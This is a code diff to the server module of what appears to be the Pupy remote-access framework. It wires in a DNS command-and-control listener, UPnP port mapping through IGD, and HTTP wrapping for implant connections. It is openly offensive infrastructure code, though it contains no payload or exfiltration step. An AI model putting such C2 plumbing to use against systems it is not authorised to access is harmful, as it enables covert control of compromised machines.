@@ -27,11 +27,13 @@ from .PupyService import PupyBindService
 from network.conf import transports
 from network.lib.connection import PupyConnectionThread
 from pupylib.utils.rpyc_utils import obtain
+from pupylib.PupyDnsCnc import PupyDnsCnc
 from .PupyTriggers import on_connect
 from network.lib.utils import parse_transports_args
 from network.lib.base import chain_transports
 from network.lib.transports.httpwrap import PupyHTTPWrapperServer
 from network.lib.base_launcher import LauncherError
+from network.lib.igd import IGDClient, UPNPError
 from os import path
 from shutil import copyfile
 from itertools import count, ifilterfalse
@@ -45,12 +47,12 @@ from . import PupyClient
 import os.path
 
 class PupyServer(threading.Thread):
-    def __init__(self, transport, transport_kwargs, port=None, igd=None, httpd=None, config=None):
+    def __init__(self, transport, transport_kwargs, port=None, config=None):
         super(PupyServer, self).__init__()
         self.daemon = True
         self.server = None
         self.authenticator = None
-        self.httpd = httpd
+        self.httpd = None
         self.clients = []
         self.jobs = {}
         self.jobs_id = 1
@@ -77,10 +79,40 @@ class PupyServer(threading.Thread):
         self.handler_registered = threading.Event()
         self.transport_kwargs = transport_kwargs
         self.categories = PupyCategories(self)
-        self.igd = igd
+        self.igd = None
         self.finished = threading.Event()
         self._cleanups = []
         self._singles = {}
+
+        if self.config.getboolean('pupyd', 'httpd'):
+            self.httpd = True
+
+        try:
+            self.igd = IGDClient(
+                available=config.getboolean('pupyd', 'igd')
+            )
+        except UPNPError as e:
+            pass
+
+        self.dnscnc = None
+
+        dnscnc = self.config.get('pupyd', 'dnscnc')
+        if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
+            if ':' in dnscnc:
+                fdqn, dnsport = dnscnc.split(':')
+            else:
+                fdqn = dnscnc.strip()
+                dnsport = 5454
+
+            self.dnscnc = PupyDnsCnc(
+                fdqn,
+                igd=self.igd,
+                port=dnsport,
+                connect_port=self.port,
+                connect_transport=self.transport,
+                config=self.config
+            )
+
 
     def create_id(self):
         """ return first lowest unused session id """
@@ -332,7 +364,7 @@ class PupyServer(threading.Thread):
 
         if self.httpd:
             t.server_transport = chain_transports(
-                PupyHTTPWrapperServer.custom(root=self.httpd),
+                PupyHTTPWrapperServer.custom(server=self),
                 t.server_transport
             )
 
